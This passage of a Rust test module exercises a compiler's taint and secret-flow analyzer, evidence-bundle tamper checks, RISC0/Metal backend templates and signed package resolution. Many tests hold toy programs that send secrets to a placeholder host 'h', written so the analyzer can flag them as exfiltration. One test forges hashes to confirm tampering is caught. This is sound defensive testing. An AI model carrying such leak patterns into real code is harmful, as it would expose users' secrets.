fn main() uses(net.send) { let v = Vault { id: 1 }; send("h", 80, v.label()); }"#,
        )
        .expect("a non-secret method return must not be flagged");
        // (#70) method→method RETURN chaining is now CLOSED by the combined method-return fixpoint:
        // `alias` returns `self.key()` where `key` mints a secret → alias is secret-returning → caught.
        let chain = tc_ok(
            r#"struct Vault { id: u32 }
impl Vault { fn key(self) { return secret_source("k"); } fn alias(self) { return self.key(); } }
fn main() uses(net.send) { let v = Vault { id: 1 }; send("h", 80, v.alias()); }"#,
        )
        .expect_err("method→method return chaining must now be flagged (#70)");
        assert!(chain.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {chain}");
    }

    #[test]
    fn top_level_destructuring_let_seeds_taint_and_secret() {
        // #69: the main-analyzer `Stmt::LetPattern` arm seeded NOTHING (not even inserting the bound
        // names into scope), so a destructured secret/tainted source laundered to egress. Now each bound
        // name is seeded with the initializer's whole-value label.
        // (confidentiality) direct secret source destructured → SECRET_EXFILTRATION.
        let sec = tc_ok(
            r#"fn main() uses(net.send) { let [a, b] = [secret_source("k"), 0]; send("h", 80, a); }"#,
        )
        .expect_err("a destructured secret source, then egressed, must be flagged");
        assert!(sec.contains("ANUBIS_SECRET_EXFILTRATION"), "got: {sec}");
        // (integrity) direct tainted source destructured → TAINTED_SINK.
        let taint = tc_ok(r#"fn main() { let [a, b] = [input(), 0]; sink(a); }"#)
            .expect_err("a destructured tainted source, then sunk, must be flagged");
        assert!(
            taint.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
            "got: {taint}"
        );
        // (#67 interaction) a method-return secret destructured is caught too (closes the asymmetry).
        tc_ok(
            r#"struct Vault { id: u32 }
impl Vault { fn key(self) { return secret_source("k"); } }
fn main() uses(net.send) { let v = Vault { id: 1 }; let [a, b] = [v.key(), 0]; send("h", 80, a); }"#,
        )
        .expect_err("a destructured method-return secret must be flagged");
        // (precision) a clean destructure still accepts.
        tc_ok(r#"fn main() uses(net.send) { let [a, b] = [1, 2]; send("h", 80, a); }"#)
            .expect("a clean destructure must not be flagged");
        // (precision) a well-formed declassify of the destructured init releases it.
        tc_ok(
            r#"fn main() uses(net.send) { let [a, b] = declassify([secret_source("k"), 0], "p", "r"); send("h", 80, a); }"#,
        )
        .expect("a declassified destructure releases");
        // (precision — span-patch) a statement-position destructure SHADOW must not leak the shadow's
        // secret onto the clean outer binding (merge_taint_over span-identity relies on the patched span).
        tc_ok(
            r#"fn main(c: bool) uses(net.send) { let [r, s] = [0, 1]; if c { let [r, s] = [secret_source("k"), 1]; } send("h", 80, r); }"#,
        )
        .expect("a statement-position destructure shadow must not over-reject the clean outer binding");
    }

    #[test]
    fn taint_reassignment_to_clean_clears_precisely() {
        // Reassign a tainted var to a clean constant → genuinely clean (precision, not over-taint).
        tc_ok(r#"fn main() uses(net.send) { let x = input(); x = 42; send("h", 80, x); }"#)
            .expect("straight-line reassign-to-clean clears the taint");
        // Cleared on BOTH branches (must-clean) → clean after the merge.
        tc_ok(r#"fn main(c: bool) uses(net.send) { let x = input(); if c { x = 1; } else { x = 2; } send("h", 80, x); }"#)
            .expect("must-clean (cleared on every path) clears the taint");
    }

    #[test]
    fn taint_reassign_clean_in_one_branch_only_stays_flagged() {
        // Cleared in one arm but tainted on the other path (no else) → may-taint keeps it flagged.
        tc_ok(r#"fn main(c: bool) uses(net.send) { let x = input(); if c { x = 1; } send("h", 80, x); }"#)
            .expect_err("tainted on the not-taken path must stay flagged (fail-closed)");
    }

    #[test]
    fn interprocedural_param_return_taint_is_flagged_at_the_call_site() {
        // Phase-3 A2: a function that RETURNS a formal parameter is summarized as
        // `returns_taint_of_params`; call sites combine that with argument taint so
        // `wrap(tainted)` taints even through let/return chains. Also: a user function that does
        // NOT return its param no longer falsely taints the call (the historical any-arg rule was
        // over-broad for known user functions).
        for (case, src) in [
            (
                "identity wrap: let y = wrap(s); sink(y)",
                r#"fn wrap(x: u32) -> u32 { return x; }
fn main() { let s = taint_source("pw"); let y = wrap(s); sink(y); }"#,
            ),
            (
                "chain: f → wrap → return param",
                r#"fn wrap(x: u32) -> u32 { return x; }
fn f(x: u32) -> u32 { let y = wrap(x); return y; }
fn main() { let s = taint_source("pw"); let z = f(s); sink(z); }"#,
            ),
            (
                "direct sink(wrap(t))",
                r#"fn wrap(x: u32) -> u32 { return x; }
fn main() { sink(wrap(taint_source("pw"))); }"#,
            ),
            (
                "only param 0 returns — second arg taints",
                r#"fn pick(a: u32, b: u32) -> u32 { return a; }
fn main() { let s = taint_source("pw"); sink(pick(s, 1)); }"#,
            ),
        ] {
            let err =
                tc_ok(src).expect_err(&format!("{case}: param→return taint must reach the sink"));
            assert!(
                err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY")
                    || err.contains("ANUBIS_INTERPROC_SINK"),
                "{case} got: {err}"
            );
        }

        // Precision: must NOT over-taint when the callee does not return the param.
        for (case, src) in [
            (
                "ignore(secret) returns a constant — clean",
                r#"fn ignore(x: u32) -> u32 { return 5; }
fn main() { let s = taint_source("pw"); let y = ignore(s); sink(y); }"#,
            ),
            (
                "pick returns a; tainted b does not taint result",
                r#"fn pick(a: u32, b: u32) -> u32 { return a; }
fn main() { let s = taint_source("pw"); sink(pick(1, s)); }"#,
            ),
            (
                "declassify before return of param",
                r#"fn wrap(x: u32) -> u32 { return declassify(x, "p", "r"); }
fn main() { let s = taint_source("pw"); sink(wrap(s)); }"#,
            ),
        ] {
            tc_ok(src).unwrap_or_else(|e| {
                panic!("{case}: non-returning / declassified path must accept: {e}")
            });
        }
    }

    #[test]
    fn interprocedural_param_sink_is_flagged_at_the_call_site() {
        // Phase-3 A1: a function that sinks a formal parameter makes the CALL SITE a sink for that
        // argument — `fn log(x){ sink(x); } ... log(tainted)` must reject even though the actual
        // `sink(...)` is inside the callee. Distinct code `ANUBIS_INTERPROC_SINK`.
        for (case, src) in [
            (
                "direct param→sink",
                r#"fn log(x: u32) { sink(x); }
fn main() { let s = taint_source("pw"); log(s); }"#,
            ),
            (
                "transitive: wrap → log → sink (fixpoint)",
                r#"fn log(x: u32) { sink(x); }
fn wrap(y: u32) { log(y); }
fn main() { let s = taint_source("pw"); wrap(s); }"#,
            ),
            (
                "param flows through a let before sink",
                r#"fn log(x: u32) { let y = x; sink(y); }
fn main() { let s = taint_source("pw"); log(s); }"#,
            ),
            (
                "second param only is a sink",
                r#"fn pair(a: u32, b: u32) { sink(b); }
fn main() { let s = taint_source("pw"); pair(1, s); }"#,
            ),
        ] {
            let err = tc_ok(src).expect_err(&format!(
                "{case}: tainted arg into a param-sinking callee must reject"
            ));
            assert!(err.contains("ANUBIS_INTERPROC_SINK"), "{case} got: {err}");
        }

        // Must NOT over-reject: clean args, declassified args, and params that do not reach a sink.
        for (case, src) in [
            (
                "clean arg into param-sinking callee",
                r#"fn log(x: u32) { sink(x); }
fn main() { log(5); }"#,
            ),
            (
                "declassify before the interproc sink call",
                r#"fn log(x: u32) { sink(x); }
fn main() { let s = taint_source("pw"); let c = declassify(s, "p", "r"); log(c); }"#,
            ),
            (
                "callee declassifies before its own sink",
                r#"fn log(x: u32) { let c = declassify(x, "p", "r"); sink(c); }
fn main() { let s = taint_source("pw"); log(s); }"#,
            ),
            (
                "param that is NOT sunk stays clean",
                r#"fn keep(a: u32, b: u32) { sink(b); }
fn main() { let s = taint_source("pw"); keep(s, 1); }"#,
            ),
            (
                "callee never sinks",
                r#"fn id(x: u32) -> u32 { return x; }
fn main() { let s = taint_source("pw"); let y = id(s); print(y); }"#,
            ),
        ] {
            tc_ok(src)
                .unwrap_or_else(|e| panic!("{case}: clean/declassified path must accept: {e}"));
        }
    }

    #[test]
    fn block_scoped_shadowing_does_not_taint_outer_binding_at_sink() {
        // Phase-3 slice B: close the pre-existing fail-CLOSED false positive where `analyze_stmts`
        // keyed taint on a flat per-name scope (no block push/pop). The *interprocedural* walk
        // already snapshotted/restored around blocks; the *intra-procedural* sink check did not —
        // so `let x=5; if c { let x=taint(); } sink(x);` was wrongly rejected even though the outer
        // clean `x` is what reaches the sink when the then-branch is a pure shadow. Now both paths
        // use the same lexical snapshot/restore.
        //
        // Pass cases: outer clean binding after a block-scoped shadow.
        for (case, src) in [
            (
                "if-then shadow does not taint outer",
                r#"fn main() {
    let x = 5;
    if true { let x = taint_source("s"); print(x); }
    sink(x);
}"#,
            ),
            (
                "if-else shadow does not taint outer",
                r#"fn main() {
    let x = 5;
    if false { let x = taint_source("s"); print(x); } else { let x = taint_source("t"); print(x); }
    sink(x);
}"#,
            ),
            (
                "while-body shadow does not taint outer",
                r#"fn main() {
    let x = 5;
    let mut i = 0;
    while i < 1 { let x = taint_source("s"); print(x); i = i + 1; }
    sink(x);
}"#,
            ),
            (
                "for-body shadow does not taint outer",
                r#"fn main() {
    let x = 5;
    for i in 0..1 { let x = taint_source("s"); print(x); }
    sink(x);
}"#,
            ),
        ] {
            tc_ok(src).unwrap_or_else(|e| {
                panic!("{case}: outer clean binding after block shadow must be accepted: {e}")
            });
        }

        // Reject cases: a real leak must still be caught (the scope fix must not open a hole).
        for (case, src) in [
            (
                "return of inner shadowed taint inside if still rejects",
                r#"fn main() {
    let x = 5;
    if true {
        let x = taint_source("s");
        sink(x);
    }
}"#,
            ),
            (
                "no shadow — outer itself is tainted",
                r#"fn main() {
    let x = taint_source("s");
    if true { let y = 1; print(y); }
    sink(x);
}"#,
            ),
            (
                "for-loop var that is tainted still rejects inside body",
                r#"fn main() {
    let xs: tainted<list> = [1, 2, 3];
    for x in xs { sink(x); }
}"#,
            ),
        ] {
            let err = tc_ok(src).expect_err(&format!("{case}: a real leak must still reject"));
            assert!(
                err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
                "{case} got: {err}"
            );
        }
    }

    #[test]
    fn interprocedural_return_taint_is_flagged_at_the_call_site() {
        // Phase-3 slice 2: a function that RETURNS internally-produced taint now taints its call
        // expression (the `Expr::Call` arm consults the `tainting_fns` summary). Before this,
        // `sink(get_secret())` passed silently even though `get_secret` returns a taint source —
        // `expr_taint_source`'s Call arm only inspected arguments. Every case below runs and is a real
        // information leak that must be REJECTED.
        for (case, src) in [
            (
                "return a taint_source local",
                r#"fn get_secret() -> u32 { let s = taint_source("pw"); return s; }
fn main() { let x = get_secret(); sink(x); }"#,
            ),
            (
                "return taint_source directly",
                r#"fn get_secret() -> u32 { return taint_source("pw"); }
fn main() { sink(get_secret()); }"#,
            ),
            (
                "return a tainted<T> local",
                r#"fn get() -> u32 { let s: tainted<u32> = symbolic(); return s; }
fn main() { sink(get()); }"#,
            ),
            (
                "transitive: a returns b() which returns taint (fixpoint)",
                r#"fn b() -> u32 { return taint_source("s"); }
fn a() -> u32 { return b(); }
fn main() { sink(a()); }"#,
            ),
        ] {
            let err = tc_ok(src).expect_err(&format!(
                "{case}: a returned-taint value reaching a sink must reject"
            ));
            assert!(
                err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
                "{case} got: {err}"
            );
        }

        // Must NOT over-taint: the summary is precise about what is RETURNED (not "touches taint
        // anywhere"), respects declassify, and leaves genuinely-clean functions clean.
        for (case, src) in [
            (
                "clean return",
                r#"fn get() -> u32 { return 5; } fn main() { sink(get()); }"#,
            ),
            (
                "declassify before return",
                r#"fn get() -> u32 { let s = taint_source("s"); return declassify(s, "p", "r"); }
fn main() { sink(get()); }"#,
            ),
            (
                "internal taint that is NOT returned",
                r#"fn f() -> u32 { let s = taint_source("s"); return 5; }
fn main() { sink(f()); }"#,
            ),
            (
                // Adversary round-2 false-positive fix: the return-taint walk respects lexical block
                // scope. An inner block-scoped `let x` shadowing a clean outer `let x` must NOT make
                // the function return-tainting when it returns the OUTER (clean) binding.
                "block-scoped shadowing, returns outer clean",
                r#"fn f(cond: bool) -> u32 { let x = 5; if cond { let x = taint_source("s"); print(x); } return x; }
fn main() { sink(f(false)); }"#,
            ),
        ] {
            tc_ok(src)
                .unwrap_or_else(|e| panic!("{case}: clean function must not be flagged: {e}"));
        }

        // Adversary round-2 false-negative fix: taint laundered through an `as` cast (both the new
        // interprocedural summary and the intra-procedural analysis gained an `Expr::Cast` arm), and a
        // return of the INNER shadowed taint must still be caught (the scope fix did not open a hole).
        for (case, src) in [
            (
                "return of a cast taint value (interprocedural)",
                r#"fn get() -> u64 { let s = taint_source("pw"); return s as u64; }
fn main() { sink(get()); }"#,
            ),
            (
                "cast taint into a sink (intra-procedural)",
                r#"fn main() { let s = taint_source("s"); sink(s as u64); }"#,
            ),
            (
                "shadowing, returns the INNER tainted binding",
                r#"fn f(cond: bool) -> u32 { let x = 5; if cond { let x = taint_source("s"); return x; } return x; }
fn main() { sink(f(true)); }"#,
            ),
        ] {
            let err = tc_ok(src).expect_err(&format!("{case}: a real leak must be rejected"));
            assert!(
                err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
                "{case} got: {err}"
            );
        }
    }

    #[test]
    fn validate_bundle_rejects_manifest_rewrite_without_manifest_hash_update() {
        use sha2::{Digest, Sha256};

        let out_dir = unique_test_dir("manifest-rewrite");
        std::fs::create_dir_all(&out_dir).unwrap();
        let src = "fn main() { let x = 1; }";
        let bundle = build_evidence_bundle(
            src,
            "safe",
            None,
            vec!["test build".into()],
            &out_dir,
            None,
            None,
        )
        .expect("bundle");

        let tampered_source = "fn main() { let x = 2; }";
        std::fs::write(bundle.dir.join("source.anubis"), tampered_source).unwrap();

        let evidence_text = std::fs::read_to_string(bundle.dir.join("evidence.json")).unwrap();
        let mut manifest: serde_json::Value = serde_json::from_str(&evidence_text).unwrap();
        let mut hasher = Sha256::new();
        hasher.update(tampered_source.as_bytes());
        manifest["source_hash"] = serde_json::Value::String(hex::encode(hasher.finalize()));
        std::fs::write(
            bundle.dir.join("evidence.json"),
            serde_json::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();

        assert!(
            !validate_bundle(&bundle.dir).expect("validate manifest tamper"),
            "rewriting source plus evidence.json must be rejected by MANIFEST.sha256"
        );

        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn hybrid_host_compiles_and_dispatches() {
        let metal_ref = std::env::var("ANUBIS_RISC0_METAL_REFERENCE").unwrap_or_default();
        if metal_ref.is_empty()
            || !std::path::Path::new(&metal_ref)
                .join("vendor/risc0-circuit-rv32im/src/prove/hal/metal.rs")
                .exists()
        {
            eprintln!("SKIP hybrid_host_compiles_and_dispatches: ANUBIS_RISC0_METAL_REFERENCE not set or vendored crate missing");
            return;
        }
        // This is the compile-gate test per strategy: drives the SHIPPED lower + real cargo build of emitted project.
        // It must fail on shim-only paths and pass only when a real binary with dispatch is produced.
        let src = include_str!("../../examples/hybrid_stub.anubis");
        let ast = parse_source(src).expect("parse hybrid_stub");
        let ir = typecheck(ast.clone(), frontend::Mode::Safe).expect("tc hybrid");
        let out = unique_test_dir("hybrid-gate");
        let _ = std::fs::remove_dir_all(&out);
        std::fs::create_dir_all(&out).unwrap();

        // lower fast: emits full project (with real RISC0+metal source) + produces fast real metal dispatch dst
        let dst =
            lower_to_native(ir, &ast.items, &out, "hybrid_gate", false).expect("lower hybrid");

        let proj = out.join("hybrid_gate-real-hybrid");
        assert!(
            proj.exists(),
            "full project must be emitted for authoritative artifact"
        );

        // Verify full source contains the real patterns (ExecutorEnv etc for when user builds with cargo)
        let full_rs = std::fs::read_to_string(proj.join("host/src/main.rs")).unwrap_or_default();
        assert!(
            full_rs.contains("ExecutorEnv") || full_rs.contains("default_prover"),
            "full project must have RISC0 prove path"
        );
        assert!(
            full_rs.contains("StorageModeShared"),
            "full project must have real metal unified buffer"
        );

        // The dst produced by lower (fast path) must be a real executable that did dispatch
        assert!(
            std::path::Path::new(&dst).exists(),
            "fast dispatch dst must exist"
        );
        let out_run = std::process::Command::new(&dst)
            .output()
            .expect("run fast dispatch dst");
        let stdout = String::from_utf8_lossy(&out_run.stdout);
        assert!(
            stdout.contains("lane=metal-hybrid") || stdout.contains("lane=cpu"),
            "must report lane from probe: {}",
            stdout
        );
        assert!(
            stdout.contains("gpu_metal_real")
                || stdout.contains("base_alloc_check")
                || stdout.contains("hybrid_real_done"),
            "must show dispatch/base guard when admitted or complete CPU fallback: {}",
            stdout
        );
        assert!(
            stdout.contains("hybrid_real_done"),
            "must complete hybrid path: {}",
            stdout
        );
        let forced_cpu = std::process::Command::new(&dst)
            .env("R0_DISABLE_METAL", "1")
            .arg("lane")
            .output()
            .expect("run forced cpu lane probe");
        let forced_stdout = String::from_utf8_lossy(&forced_cpu.stdout);
        assert!(
            forced_stdout.contains("lane=cpu"),
            "R0_DISABLE_METAL=1 must force CPU lane: {}",
            forced_stdout
        );
        let _ = std::fs::remove_dir_all(&out);
    }

    #[test]
    fn hybrid_full_project_emits_methods_vendor_patch_and_receipt_contract() {
        let metal_ref = std::env::var("ANUBIS_RISC0_METAL_REFERENCE").unwrap_or_default();
        if metal_ref.is_empty()
            || !std::path::Path::new(&metal_ref)
                .join("vendor/risc0-circuit-rv32im/src/prove/hal/metal.rs")
                .exists()
        {
            eprintln!("SKIP hybrid_full_project_emits_methods_vendor_patch_and_receipt_contract: ANUBIS_RISC0_METAL_REFERENCE not set or vendored crate missing");
            return;
        }
        let out = unique_test_dir("hybrid-full-contract");
        let _ = std::fs::remove_dir_all(&out);
        std::fs::create_dir_all(&out).unwrap();

        let proj = out.join("hybrid_contract-real-hybrid");
        crate::backends::native::hybrid::emit_hybrid_project(&proj, true, "42")
            .expect("emit full hybrid project");

        let root_cargo = std::fs::read_to_string(proj.join("Cargo.toml")).expect("root cargo");
        assert!(
            root_cargo.contains("[patch.crates-io]")
                && root_cargo.contains("vendor/risc0-circuit-rv32im"),
            "full hybrid workspace must patch crates.io to the vendored risc0-circuit-rv32im crate:\n{}",
            root_cargo
        );
        assert!(
            proj.join("vendor/risc0-circuit-rv32im/src/prove/hal/metal.rs")
                .exists(),
            "full hybrid project must carry the patched Metal circuit HAL"
        );

        let host_cargo = std::fs::read_to_string(proj.join("host/Cargo.toml")).expect("host cargo");
        assert!(
            host_cargo.contains("risc0-zkvm = { version = \"=3.0.5\"")
                && host_cargo.contains("disable-dev-mode")
                && host_cargo.contains("risc0-circuit-rv32im = { version = \"=4.0.4\""),
            "host must pin the measured risc0-metal-hybrid dependency shape:\n{}",
            host_cargo
        );
        assert!(
            std::fs::read_to_string(proj.join("methods/build.rs"))
                .expect("methods build")
                .contains("risc0_build::embed_methods"),
            "methods crate must automatically generate guest ELF/image ID"
        );
        assert!(
            std::fs::read_to_string(proj.join("methods/src/lib.rs"))
                .expect("methods lib")
                .contains("methods.rs"),
            "methods lib must expose generated constants"
        );

        let host_main = std::fs::read_to_string(proj.join("host/src/main.rs")).expect("host main");
        for needle in [
            "ANUBIS_ELF",
            "ANUBIS_ID",
            "receipt.verify(ANUBIS_ID)",
            "RECEIPT VERIFIED",
            "risc0_circuit_rv32im::prove::metal_lane_selected()",
            "R0_DISABLE_METAL",
            "ANUBIS_REQUIRE_METAL",
        ] {
            assert!(
                host_main.contains(needle),
                "full host must contain `{}` in receipt/lane contract:\n{}",
                needle,
                host_main
            );
        }

        let _ = std::fs::remove_dir_all(&out);
    }

    #[test]
    fn hybrid_emission_snapshot() {
        let full = include_str!("backends/native/hybrid/templates/host_main_full.rs");
        for needle in [
            "MTLArgumentBuffersTier::Tier2",
            "R0_DISABLE_METAL",
            "ANUBIS_REQUIRE_METAL",
            "fn lane()",
            "lane=metal-hybrid",
            "lane=cpu",
            "get_prover_server",
            "ProverOpts",
            "receipt.verify",
            "RECEIPT VERIFIED",
            "checked_base_ptr",
            "StorageModeShared",
            "wait_until_completed",
        ] {
            assert!(
                full.contains(needle),
                "full hybrid template must contain reference contract marker `{}`:\n{}",
                needle,
                full
            );
        }
        assert!(
            !full.contains("default_prover"),
            "full hybrid template must use reference get_prover_server path, not default_prover"
        );
        assert!(
            full.contains("bincode::serialize(&receipt)"),
            "full hybrid template must serialize the real receipt, not write a marker:\n{}",
            full
        );
        assert!(
            !full.contains("RISC0_RECEIPT_FRESH_FOR_GATE10"),
            "full hybrid template must not emit the old Gate 10 marker receipt:\n{}",
            full
        );
    }

    #[test]
    fn hybrid_fast_template_honors_lane_contract() {
        let fast = include_str!("backends/native/hybrid/templates/host_main.rs");
        for needle in [
            "MTLArgumentBuffersTier::Tier2",
            "R0_DISABLE_METAL",
            "ANUBIS_REQUIRE_METAL",
            "fn lane()",
            "lane=metal-hybrid",
            "lane=cpu",
            "checked_base_ptr",
            "StorageModeShared",
            "wait_until_completed",
        ] {
            assert!(
                fast.contains(needle),
                "fast hybrid template must contain lane contract marker `{}`:\n{}",
                needle,
                fast
            );
        }
    }

    #[test]
    fn hybrid_generated_cargo_projects_are_workspace_isolated() {
        for (name, cargo_toml) in [
            (
                "fast",
                include_str!("backends/native/hybrid/templates/Cargo.fast.toml"),
            ),
            (
                "full",
                include_str!("backends/native/hybrid/templates/Cargo.full.toml"),
            ),
        ] {
            assert!(
                cargo_toml.contains("[workspace]"),
                "{} hybrid Cargo.toml must be a workspace root so parent workspaces cannot capture generated projects:\n{}",
                name,
                cargo_toml
            );
        }
    }

    #[test]
    fn hybrid_full_template_uses_risc0_305_receipt_shape() {
        let full = include_str!("backends/native/hybrid/templates/host_main_full.rs");
        assert!(
            full.contains("receipt.verify(ANUBIS_ID)"),
            "full host must verify against generated ANUBIS_ID:\n{}",
            full
        );
        assert!(
            full.contains("decode().expect(\"decode journal\")"),
            "full host must assert the journal after stock receipt verification:\n{}",
            full
        );
    }
}

#[cfg(test)]
mod phase6_package_tests {
    use super::*;
    use crate::package::lock::LOCK_FILENAME;
    use crate::package::merkle;
    use crate::package::registry;
    use crate::package::resolve_deps::{resolve_workspace, ResolveOptions};
    use crate::package::trust::TrustStore;
    use crate::project::ProjectLayout;

    fn write(root: &std::path::Path, rel: &str, body: &str) {
        let p = root.join(rel);
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(p, body).unwrap();
    }

    fn seal_signed_evidence(pkg_root: &std::path::Path, src: &str) -> String {
        let out = pkg_root.join("out");
        std::fs::create_dir_all(&out).unwrap();
        let bundle = evidence::build_evidence_bundle(src, "safe", None, vec![], &out, None, None)
            .expect("evidence");
        // Crown: overwrite summaries with package-faithful extract (name/version/module merkle).
        let sum = crate::package::summary::extract_from_package(pkg_root).expect("summaries");
        crate::package::summary::write_to_evidence_dir(&bundle.dir, &sum).expect("write sum");
        evidence::refresh_manifest_hashes(&bundle.dir).expect("manifest");
        let (sk, pk) = evidence::generate_keypair().unwrap();
        evidence::sign_pca(&bundle.dir, &sk).unwrap();
        // Copy sealed evidence into package as evidence/
        let dest = pkg_root.join("evidence");
        let _ = std::fs::remove_dir_all(&dest);
        copy_dir(&bundle.dir, &dest);
        pk
    }

    fn copy_dir(src: &std::path::Path, dst: &std::path::Path) {
        std::fs::create_dir_all(dst).unwrap();
        for ent in std::fs::read_dir(src).unwrap() {
            let ent = ent.unwrap();
            let from = ent.path();
            let to = dst.join(ent.file_name());
            if from.is_dir() {
                copy_dir(&from, &to);
            } else {
                std::fs::copy(&from, &to).unwrap();
            }
        }
    }

    #[test]
    fn phase6_merkle_single_leaf_matches_sha256_golden() {
        let body = b"fn main() { print(1); }\n";
        let root = merkle::merkle_root(vec![("source.anubis".into(), body.to_vec())]);
        assert_eq!(root, merkle::sha256_hex(body));
        // build_evidence_bundle single-file path must stay golden-stable
        let tmp = tempfile::tempdir().unwrap();
        let bundle = evidence::build_evidence_bundle(
            std::str::from_utf8(body).unwrap(),
            "safe",
            None,
            vec![],
            tmp.path(),
            None,
            None,
        )
        .unwrap();
        assert_eq!(bundle.manifest.source_hash, merkle::sha256_hex(body));
    }

    #[test]
    fn phase6_unsigned_dep_fails_closed() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("math_lib");
        let app = root.join("app");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.0.0\"\n",
        );
        write(&lib, "src/lib.anb", "pub fn add(a, b) { return a + b; }\n");
        // Unsigned evidence only
        let out = lib.join("out");
        std::fs::create_dir_all(&out).unwrap();
        let src = std::fs::read_to_string(lib.join("src/lib.anb")).unwrap();
        let bundle =
            evidence::build_evidence_bundle(&src, "safe", None, vec![], &out, None, None).unwrap();
        copy_dir(&bundle.dir, &lib.join("evidence"));
        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = { path = \"../math_lib\" }\n",
        );
        write(&app, "main.anb", "fn main() {}\n");
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let err = resolve_workspace(
            &layout,
            &ResolveOptions {
                write_lock: true,
                allow_unsigned: false,
                skip_proof: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                trust_path: Some(root.join("trust.toml")),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(
            err.contains("ANUBIS_DEP_PROOF_UNVERIFIED"),
            "got: {err}"
        );
        // Dual-gate allow: only when allow_unsigned=true (CLI+env enforced by CLI layer)
        let ws = resolve_workspace(
            &layout,
            &ResolveOptions {
                write_lock: true,
                allow_unsigned: true,
                skip_proof: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                trust_path: Some(root.join("trust.toml")),
                ..Default::default()
            },
        )
        .expect("unsigned allowed");
        assert!(ws.deps.contains_key("math"));
    }

    #[test]
    fn phase6_registry_publish_and_resolve() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("math_lib");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.2.0\"\n",
        );
        write(&lib, "src/lib.anb", "pub fn add(a, b) { return a + b; }\n");
        let src = std::fs::read_to_string(lib.join("src/lib.anb")).unwrap();
        let pk = seal_signed_evidence(&lib, &src);
        let reg = root.join("registry");
        let dest = registry::publish_to_registry(&reg, "math", "1.2.0", &lib).unwrap();
        assert!(dest.is_dir());
        let (ver, path, sha) = registry::resolve_version(&reg, "math", "^1.0").unwrap();
        assert_eq!(ver, "1.2.0");
        assert_eq!(path, dest);
        assert_eq!(sha, merkle::merkle_root_dir(&dest).unwrap());

        let app = root.join("app");
        std::fs::create_dir_all(&app).unwrap();
        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = \"^1.0\"\n",
        );
        write(
            &app,
            "main.anb",
            "import math;\nfn main() { print(math::add(1, 2)); }\n",
        );
        let trust_path = root.join("trust.toml");
        let mut trust = TrustStore::default();
        trust.add(&pk, "reg");
        trust.save(&trust_path).unwrap();
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let opts = ResolveOptions {
            write_lock: true,
            allow_unsigned: false,
            skip_proof: false,
            cache_root: Some(root.join("cache")),
            registry_root: Some(reg),
            trust_path: Some(trust_path.clone()),
                ..Default::default()
            };
        let ws = resolve_workspace(&layout, &opts).expect("registry resolve");
        assert_eq!(ws.deps["math"].version, "1.2.0");
        assert!(app.join(LOCK_FILENAME).is_file());
        // Cache materialization path exists
        assert!(ws.deps["math"].root.is_dir());
    }

    #[test]
    fn phase6_dep_closure_bound_in_evidence_tree() {
        let tmp = tempfile::tempdir().unwrap();
        let files = vec![
            ("a.anb".into(), b"fn a() {}".to_vec()),
            ("b.anb".into(), b"fn b() {}".to_vec()),
        ];
        let closure = serde_json::json!({
            "schema": "anubis.dep_closure.v1",
            "packages": [{"name": "math", "version": "1.0.0", "content_sha256": "abc"}]
        });
        let bundle = evidence::build_evidence_bundle_tree(
            &files,
            "safe",
            None,
            vec!["test".into()],
            tmp.path(),
            Some("safe"),
            None,
            Some(&closure),
        )
        .unwrap();
        assert!(bundle.dir.join("dep_closure.json").is_file());
        assert!(bundle.dir.join("source-merkle-leaves.json").is_file());
        let man = std::fs::read_to_string(bundle.dir.join("MANIFEST.sha256")).unwrap();
        assert!(
            man.contains("dep_closure.json"),
            "top-level signature binds dep_closure via MANIFEST"
        );
        // Multi-leaf source_hash is not bare sha of either file alone
        assert_ne!(
            bundle.manifest.source_hash,
            merkle::sha256_hex(b"fn a() {}")
        );
    }

    #[test]
    fn phase6_path_dep_resolves_imports_and_typechecks() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("math_lib");
        let app = root.join("app");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();

        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.0.0\"\n",
        );
        write(&lib, "src/lib.anb", "pub fn add(a, b) { return a + b; }\n");
        let lib_src = std::fs::read_to_string(lib.join("src/lib.anb")).unwrap();
        let pk = seal_signed_evidence(&lib, &lib_src);

        // Trust the signer
        let trust_path = root.join("trust/signers.toml");
        let mut trust = TrustStore::default();
        trust.add(&pk, "test");
        trust.save(&trust_path).unwrap();

        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = { path = \"../math_lib\" }\n",
        );
        write(
            &app,
            "main.anb",
            "import math;\nfn main() { print(math::add(2, 3)); }\n",
        );

        // Lock with write + proof verify
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let opts = ResolveOptions {
            trust_path: Some(trust_path.clone()),
            write_lock: true,
            allow_unsigned: false,
            skip_proof: false,
            cache_root: Some(root.join("cache")),
            registry_root: Some(root.join("registry")),
                ..Default::default()
            };
